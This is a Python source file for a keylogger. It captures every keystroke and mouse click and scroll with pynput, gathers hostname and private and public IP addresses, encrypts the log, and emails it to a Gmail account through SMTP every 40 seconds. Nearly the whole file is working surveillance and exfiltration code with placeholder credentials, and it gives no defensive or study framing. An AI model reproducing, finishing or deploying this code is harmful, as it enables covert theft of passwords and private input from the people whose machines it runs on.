import logging
import os
import platform
import smtplib
import socket
import threading
import wave

from cryptography.fernet import Fernet
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener

class KeyLogger:
    def __init__(self, time_interval, email, password,key):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password
        self.key=key
        
    def on_move(self, x, y):
        counter=0

    def on_click(self, x, y,button,pressed):
        current_click = '\n'+"Mouse pressed in {"+str(x)+","+str(y)+"}"
        self.appendlog(current_click)

    def on_scroll(self, x, y,button, pressed):
        current_scroll = '\n'+"Mouse scrolled in {"+str(x)+","+str(y)+"}"
        self.appendlog(current_scroll)
        
    def computer_information(self):
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            self.appendlog( "Public IP Address: " + str(public_ip))
        except Exception:
            self.appendlog(  "couldn't get Public IP Address")

        self.appendlog(  "Processor: " + (platform.processor()) + '\n')
        self.appendlog(  "System: " + platform.system() + " " + platform.version() + '\n')
        self.appendlog(  "Machine: " + platform.machine() + "\n")
        self.appendlog(  "Hostname: " + hostname + "\n")
        self.appendlog(  "Private Ip Address: " + IPAddr + "\n")
        
    def encrypting_files(self):
        fernet=Fernet(key)
        encrypted = fernet.encrypt(bytes(self.log,'utf-8'))
        print("Encrypted email===================")
        print(encrypted)
        self.send_mail(self.email, self.password ,encrypted)

    
    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        current_key =str(key).replace("'", "")
        if current_key=="Key.space":
            self.appendlog(" ")
        elif current_key=="Key.enter":
            self.appendlog('\n')
        else:
            self.appendlog(current_key)
        print(self.log)
        

    def send_mail(self, email, password, message):
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        self.log = ""

    def report(self):
        self.encrypting_files()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        self.computer_information()
        print(self.log)
        keyboard_listener = KeyboardListener(on_press=self.save_data)
        mouse_listener = MouseListener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)
        keyboard_listener.start()
        mouse_listener.start()
        self.report()

        mouse_listener.join()
        keyboard_listener.join()
        


            







email_address = "your email"
password = "your password"
key ="your key"

keylogger = KeyLogger(40, email_address, password,key)
keylogger.run()
